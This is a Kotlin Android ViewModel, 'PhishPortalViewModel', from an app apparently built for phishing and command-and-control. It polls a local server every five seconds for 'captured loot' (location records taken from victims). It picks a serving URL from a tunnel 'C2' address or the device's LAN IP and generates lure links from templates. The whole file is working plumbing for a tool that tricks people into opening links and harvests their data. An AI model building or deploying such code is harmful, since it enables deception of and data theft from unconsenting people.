package com.example.rabit.ui.automation

import androidx.lifecycle.ViewModel
import androidx.lifecycle.viewModelScope
import com.example.rabit.data.network.LanIpResolver
import com.example.rabit.data.network.RabitNetworkServer
import kotlinx.coroutines.delay
import kotlinx.coroutines.flow.MutableStateFlow
import kotlinx.coroutines.flow.asStateFlow
import kotlinx.coroutines.launch
import android.app.Application
import androidx.lifecycle.AndroidViewModel

class PhishPortalViewModel(application: Application) : AndroidViewModel(application) {
    private val _capturedLoot = MutableStateFlow<List<RabitNetworkServer.LootLocation>>(emptyList())
    val capturedLoot = _capturedLoot.asStateFlow()

    private val _serverUrl = MutableStateFlow("")
    val serverUrl = _serverUrl.asStateFlow()

    init {
        refreshLoot()
        viewModelScope.launch {
            val localIp = LanIpResolver.preferredLanIpv4String(getApplication())
            // React to tunnel state changes
            launch {
                com.example.rabit.data.config.TacticalConfig.isTunnelActive.collect { active ->
                    updateUrl(active, com.example.rabit.data.config.TacticalConfig.globalC2Address.value, localIp)
                }
            }
            // Also react to address changes specifically
            launch {
                com.example.rabit.data.config.TacticalConfig.globalC2Address.collect { addr ->
                    updateUrl(com.example.rabit.data.config.TacticalConfig.isTunnelActive.value, addr, localIp)
                }
            }
        }
        
        viewModelScope.launch {
            while(true) {
                refreshLoot()
                delay(5000)
            }
        }
    }

    private fun updateUrl(active: Boolean, globalAddr: String, localIp: String?) {
        if (active && globalAddr.isNotBlank()) {
            _serverUrl.value = if (globalAddr.startsWith("http")) globalAddr else "http://$globalAddr"
        } else {
            _serverUrl.value = if (localIp != null) "http://$localIp:${RabitNetworkServer.PORT}" else "http://localhost:${RabitNetworkServer.PORT}"
        }
    }

    fun refreshLoot() {
        _capturedLoot.value = RabitNetworkServer.getCapturedLoot()
    }

    fun clearLoot() {
        RabitNetworkServer.clearLoot()
        refreshLoot()
    }
    
    fun generateLink(template: String): String {
        return "${_serverUrl.value}/t/$template"
    }
}
